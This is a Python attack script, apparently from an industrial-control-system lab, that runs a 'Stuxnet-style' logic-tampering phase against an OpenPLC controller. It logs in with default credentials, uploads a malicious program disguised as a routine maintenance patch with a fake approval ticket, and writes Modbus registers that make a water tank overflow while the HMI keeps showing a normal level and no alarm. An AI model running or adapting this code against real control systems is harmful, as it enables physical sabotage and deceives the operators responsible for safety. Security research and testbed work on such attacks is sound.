#!/usr/bin/env python3
"""
ATTACK PHASE 3 -- LOGIC TAMPERING (Stuxnet-style).
From the attacker container:
  1. Log into the OpenPLC web UI with default creds (openplc/openplc).
  2. Upload the tampered program under an innocent name/description
     ("Maintenance update v1.2"), compile it and start it.
  3. Re-apply a small Modbus push so the now-UNSAFE logic overflows the tank
     while the HMI keeps showing a calm, normal level with no alarm.

After this phase: operator sees ~normal; the true level (%MW10) overflows.
"""
import time
from openplc_web import OpenPLC, log as weblog
from modbus_io import (connect, snapshot, log, UNIT, HR_SP_HIGH, HR_MANUAL)
import os

PLC_WEB = os.environ.get("PLC_WEB", "http://172.28.0.10:8080")
MALICIOUS_ST = "/app/programs/water_tank_malicious.st"
COVER_NAME = "Maintenance update v1.2"
COVER_DESCR = ("Routine maintenance patch - sensor scaling fix and minor "
               "cleanup. No functional change. Approved: maint-ticket #4471.")


def show(c, when):
    s = snapshot(c)
    log(f"state {when}: level_hmi={s.get('level_hmi')} true_level={s.get('true_level')} "
        f"pump={s.get('pump')} alarm={s.get('alarm')} overflow={s.get('overflow')}")
    return s


def main():
    log("=== PHASE 3: LOGIC TAMPERING via OpenPLC web UI ===")
    plc = OpenPLC(PLC_WEB)
    if not plc.login("openplc", "openplc"):
        log("ERROR: web login failed"); return 1
    pf = plc.upload_and_compile(MALICIOUS_ST, COVER_NAME, COVER_DESCR)
    if pf is None:
        log("ERROR: malicious upload/compile failed"); return 1
    plc.start()
    log("tampered program is RUNNING; waiting for the runtime/Modbus to settle...")
    time.sleep(6)

    c = connect()
    show(c, "AFTER-TAMPER-START")
    log("Re-applying Modbus push on the now-unsafe logic (force pump, raise setpoint)")
    c.write_registers(HR_MANUAL, [1], slave=UNIT)
    c.write_register(HR_SP_HIGH, 2000, slave=UNIT)

    log("Letting the tampered process run to overflow (~2-3 min)...")
    for _ in range(18):
        time.sleep(10)
        show(c, "running")
    c.close()
    log("=== PHASE 3 complete — HMI shows normal, true level has overflowed. ===")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
